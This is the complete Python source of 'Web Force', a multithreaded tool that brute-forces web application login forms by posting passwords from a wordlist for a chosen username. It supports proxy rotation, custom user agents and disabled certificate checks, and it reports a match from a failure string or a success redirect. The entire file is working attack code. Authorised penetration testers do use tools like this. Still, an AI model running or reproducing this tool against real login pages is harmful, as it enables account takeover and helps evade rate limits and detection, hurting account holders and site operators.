#!/usr/bin/env python3
import requests
import argparse
import threading
import time
import sys
import logging
import random
parser= argparse.ArgumentParser(description="Web Force is a web app password bruteforce tool")
parser.add_argument('-t','--target',required=True,help="Provide Target Url")
parser.add_argument('-u','--username',required=True,help="Provide Username")
parser.add_argument('-w','--wordlist',required=True,help="Path to wordlist")
parser.add_argument('-f','--failed',default='Invalid', help="Provide the string that occurs on invlaid creds.")
parser.add_argument('-uf','--usernamef',default="username",help="Provide Username feild")
parser.add_argument('-pf','--passwordf',default="password",help="Provide Password feild")
parser.add_argument('-T', '--timeout', default=5, type=int, help="Request timeout in seconds (default:5)")
parser.add_argument('-th','--threads', default=1, type=int, help="Number of thread (default:1)")
parser.add_argument('-ua', '--useragent', default="Mozilla/5.0", help="Provide user agent")
parser.add_argument('-r','--redirect', help='Provide the location webapp redirects to(on success)')
parser.add_argument('--proxy', help='Use a single proxy (e.g. http://127.0.0.1:8080)')
parser.add_argument('--proxylist', help='Use a list of proxies (one per line)')
parser.add_argument('--no-verify', action='store_true', help='Disable SSL certificate verification')
parser.add_argument('--log', action='store_true', help='Enables logging to webforce.log')
args= parser.parse_args()

headers={'User-Agent':args.useragent}
print(f"Target: {args.target} Set")
print(f"Username: {args.username} Set")
print(f"Path to wordlist: {args.wordlist} Set")
print(f"String indicating failed attempt set as: {args.failed}")
print(f"Username field: {args.usernamef}")
print(f"Password field: {args.passwordf}")
print(f"Request TimeOut in: {args.timeout}s")
print(f"Number of threads utilizing: {args.threads}")
print(f"Our user agent is: {args.useragent}")

found = threading.Event()
lock = threading.Lock()
thread_local = threading.local()

def load_proxies(proxylist):
    try:
        with open(proxylist) as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("The given list of proxies does not exists.")
        sys.exit(1)

def get_session(proxies=None):
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        session.headers.update(headers)

        if proxies:
            proxy = random.choice(proxies)
            session.proxies={
                'http':proxy,
                'https':proxy
            }
        elif args.proxy:
            session.proxies={
                'http':args.proxy,
                'https':args.proxy
            }
        thread_local.session = session
    return thread_local.session

def check_logging(log):
    if log:
        logging.basicConfig(
            filename='webforce.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        print("[*] Logging is enabled. Output will be saved to 'webforce.log'")
    else:
        logging.disable(logging.CRITICAL)
        
def password_extract(wordlist):
    try:
        with open(wordlist,'r',encoding="latin-1") as file:
            for line in file:
                yield line.strip()
    except FileNotFoundError:
        print("The provided file path is not valid. Please Check Again")
        exit(1)

def attempt_login(password, proxies=None):
    if found.is_set():
        return
    session = get_session(proxies)
    data = {args.usernamef:args.username, args.passwordf:password}
    try:
        response = session.post(args.target,data, timeout=args.timeout, allow_redirects=False, verify=not(args.no_verify))
        if args.redirect:
                location = response.headers.get("Location", "")
                if args.redirect in location:
                    with lock:
                        print(f"[+] Success! Password found: {password}")
                        logging.info(f"Success! Password found: {password}")
                    found.set()
                else:
                    with lock:
                        print(f"[-] Tried: {password} - Failed")
                        logging.info(f"Tried: {password} - Failed")
        else:
            if args.failed not in response.text:
                with lock:
                    print(f"[+] Success! Password found: {password}")
                    logging.info(f"Success! Password found: {password}")
                found.set()
            else:
                with lock:
                    print(f"[-] Tried: {password} - Failed")
                    logging.info(f"Tried: {password} - Failed")
    except requests.exceptions.RequestException as e:
        with lock:
            print(f"An error occured {e}")
            logging.error(f"An request error occured {e}")


def main():
        proxies = load_proxies(args.proxylist) if args.proxylist else None
        print("BruteForce Starts!")
        check_logging(args.log)
        passwords=password_extract(args.wordlist)

        if args.threads==1:
            for password in passwords:
                if found.is_set():
                    return
                attempt_login(password,proxies)
        else:
            threads = []
            for password in passwords:
                if found.is_set():
                    break
                while threading.active_count()-1 >= args.threads:
                    time.sleep(0.1)
                t = threading.Thread(target=attempt_login, args=(password,proxies))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()
            
        if not found.is_set():
            print("[-] Password not found in wordlist.")
            logging.info("Password not found in wordlist.")
            sys.exit(1)
        else:
            sys.exit(0)

try:
    main()
except KeyboardInterrupt:
    print("\nWeb Force is terminated Successfully")
    logging.error("Keyboard Interrupt")

        
            
